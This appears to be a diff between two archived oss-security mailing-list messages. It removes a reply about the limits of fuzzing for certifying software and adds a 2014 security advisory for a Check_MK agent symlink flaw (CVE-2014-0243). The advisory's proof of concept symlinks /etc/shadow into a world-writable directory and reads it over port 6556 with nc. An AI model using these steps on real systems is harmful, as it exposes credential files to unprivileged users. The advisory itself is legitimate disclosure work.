@@ -1,34 +1,154 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/18/7
-Message-ID: <CAH72vigDpcFLGufy3KSWJrRrqKypTcR3M_-aV7Br9vr2dVy6TQ@mail.gmail.com>
-Date: Tue, 18 Nov 2014 12:17:12 +0100
-From: Źmicier Januszkiewicz <gauri@....by>
-To: oss-security@...ts.openwall.com
-Subject: Re: Fuzzing findings (and maybe CVE requests) - Image/GraphicsMagick, elfutils, GIMP, gdk-pixbuf, file, ndisasm, less
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/28/1
+Message-ID: <53858A6B.8030709@lsexperts.de>
+Date: Wed, 28 May 2014 09:04:11 +0200
+From: "LSE Leading Security Experts GmbH (Security Advisories)" <advisories@...xperts.de>
+To: bugtraq@...urityfocus.com
+Cc: oss-security@...ts.openwall.com, fulldisclosure@...lists.org, bugs@...uritytracker.com
+Subject: LSE Leading Security Experts GmbH - LSE-2014-05-21 - Check_MK - Arbitrary File Disclosure Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-2014-11-18 4:37 GMT+01:00 Robert Watson <robertcwatson1@...il.com>:
 
-> What about using fuzzing to find those tools withOUT vulnerabilities and
-> "certifying them" in some way as safe for all inputs?
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-I think the main issue with this approach would be that one cannot
-prove that something DOES NOT exist. One can easily prove that
-something DOES exist by producing evidence: you can prove a bug exists
-by providing reproduction steps or a proof-of-concept file that
-triggers the issue. On the other hand, it would be very problematic to
-prove a program is bug-free -- what evidence can you bring to support
-that? Since one can theoretically produce an infinite amount of test
-cases given e.g. a grammar, how would you test a program against "all
-inputs"? If it's via fuzzing, who can "certify" that a fuzzer you used
-indeed produced "all inputs"? Would we need fuzzer certifications,
-then?
+=== LSE Leading Security Experts GmbH - Security Advisory LSE-2014-05-21 ===
 
-I think every time after a product passes an audit, a certification,
-or whatever, another guy comes about and spots a security issue nobody
-else has spotted before. Is the product still secure? Does that kind
-of certification actually mean anything with respect to "having no
-bugs"? I strongly doubt that.
+Check_MK - Arbitrary File Disclosure Vulnerability
+- --------------------------------------------------
 
-Cheers,
-Z.
+Affected Versions
+=================
+Linux versions of Check_MK equal or greater than commit
+7e9088c09963cb2e76030e8b645607692ec56011 until Release v1.2.5i2p1.
+
+Other platforms are not affected as the vulnerable feature is not
+implemented there.
+
+Issue Overview
+==============
+Technical Risk: high
+Likelihood of Exploitation: high
+Vendor: Mathias Kettner GmbH
+Credits: LSE Leading Security Experts GmbH employees
+  Markus Vervier and Sascha Kettler
+Advisory URL: https://www.lsexperts.de/advisories/lse-2014-05-21.txt
+Advisory Status: Public
+CVE-Number: CVE-2014-0243
+
+Issue Description
+=================
+While conducting a whitebox test LSE Leading Security Experts GmbH
+discovered that the Check_MK agent processes files from a directory
+with mode 1777. It is not checked if the files are symbolic or hard
+filesystem links.
+
+As the Check_MK agent runs with root permissions by default, it will
+read arbitrary files and readable devices with root permissions.
+
+The directory mode 1777 was introduced on Sep 5 15:49:46 2013 +0200
+in commit 7e9088c09963cb2e76030e8b645607692ec56011:
+
+<<>>
+commit 7e9088c09963cb2e76030e8b645607692ec56011
+Author: Bernd Stroessenreuther <bs@...hias-kettner.de>
+Date:   Thu Sep 5 15:49:46 2013 +0200
+
+    mk-job: /var/lib/check_mk_agent/job directory is now
+    created with mode 1777 so mk-job can be used by
+    unprivileged users too: fixing bug #1040
+<<>>
+
+The vulnerable code in the agent for reading job results from
+"/var/lib/check_mk_agent/job" is:
+
+<<>>
+# Get statistics about monitored jobs
+if cd /var/lib/check_mk_agent/job; then
+    echo '<<<job>>>'
+    head -n -0 -v *
+fi
+<<>>
+
+Impact
+======
+A local user may create a symbolic link in the directory
+"/var/lib/check_mk_agent/job", pointing to a file he normally would
+not have access to like "/etc/shadow". The agent expects output from
+jobs using the mk-job Tool in that directory. It will output the
+content of all files in the directory on TCP port 6556 by default.
+
+Temporary Workaround and Fix
+============================
+LSE Leading Security Experts GmbH advises to remove the write
+permissions and the sticky bit for non root users temporarily by
+setting mode 755 on the directory.
+
+Proof of Concept
+================
+    [myhost]$ pwd
+    /var/lib/check_mk_agent/job
+    [myhost]$ ls -l
+    total 0
+    [myhost]$ ln -s /etc/shadow
+    [myhost]$ ls -la
+    total 4
+    drwxrwxrwt 2 root   root    4096 May 21 15:17 .
+    drwxr-xr-x 3 root   root    4096 Feb 26 13:54 ..
+    lrwxrwxrwx 1 myuser mygroup   11 May 21 15:17 shadow -> /etc/shadow
+    [myhost]$ nc 127.0.0.1 6556
+    [...]
+    <<<job>>>
+    ==> shadow <==
+    root:$6$[...]:16133:0:99999:7:::
+    bin:*:15937:0:99999:7:::
+    daemon:*:15937:0:99999:7:::
+    adm:*:15937:0:99999:7:::
+    lp:*:15937:0:99999:7:::
+    sync:*:15937:0:99999:7:::
+    shutdown:*:15937:0:99999:7:::
+    halt:*:15937:0:99999:7:::
+    mail:*:15937:0:99999:7:::
+    uucp:*:15937:0:99999:7:::
+    operator:*:15937:0:99999:7:::
+    games:*:15937:0:99999:7:::
+    gopher:*:15937:0:99999:7:::
+    ftp:*:15937:0:99999:7:::
+    nobody:*:15937:0:99999:7:::
+    [...]
+
+History
+=======
+2014-05-20  Issue discovery
+2014-05-21  Permission of customer for advisory
+2014-05-21  Vendor informed
+2014-05-22  CVE requested
+2014-05-22  Vendor response
+2014-05-22  CVE-2014-0243 assigned
+2014-05-26  Official fix available
+2014-05-27  Advisory release
+
+- -- 
+http://www.lsexperts.de
+LSE Leading Security Experts GmbH, Postfach 100121, 64201 Darmstadt
+Tel.: +49 (0) 6151 86086-0, Fax: -299,
+Unternehmenssitz: Weiterstadt, Amtsgericht Darmstadt: HRB8649
+Geschäftsführer: Oliver Michel, Sven Walther
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (FreeBSD)
+
+iQIcBAEBAgAGBQJThYprAAoJEDgSCSGZ4yd8BgEP/07sJ4P4aByGKhCJmdmKo9+v
+IdGPSYWqWp2Y2iIuE0J8zIkss0SHwU6bFa27h5pIplqUNDFiu4ycOlCpUkx0yh/F
+z2DKxDGFQicegYHWj96Eagstj32P+vfo08yoLwxgC7vQawpbvTTM4edyunHUAuX9
+r4Pb9Ia2OjFP+ePpP4Vp4HVHWEmO9kpEjm7irMvN+5Ft/fiMrrfafFXQk7/TO3Xr
+jGyx+l/Hw0znGUWgRVPicaztpD72ZhYwYy1AC5mltXniqVDxP3xWjJMGrtwl4bW4
+o+GWTdOn9sEV8V+quvAz9SLCvmGCghaakJqKYmzVLVP4+2I3M6mcu2l/1pl6M5jE
+li+LScA9Fw6CwmUmk9gTduRTrHxcSWEzdRjrFll/Qh6DaU92YBTtfb5a7YCpFp+S
+7Yf/ECA0BXTsfhY+M3CNUBSiJRCW6NQABIH/maOsK/u/Mq/gFcV0R/gd24YMIq1F
+GzNzZPmNmGlqaZHcMijgdnJ9MKKxA/qLlhV4fAULafNq0fGz+gnp2H/CoJCLogLd
+euJWtvcgqhOd5/m8O8YUi9pmyioHq7GNeN0oz+9MLurVKGZqilxCGaU1OLfSrwzx
+z72qzSt3txs8+s72LGDMcw0/OOx0KYm3xYekzkRyOs4JkDOSIATAhvhSTbdp2myX
+Kt8H8xrSmzdyUbTISR3E
+=rbLP
+-----END PGP SIGNATURE-----
+
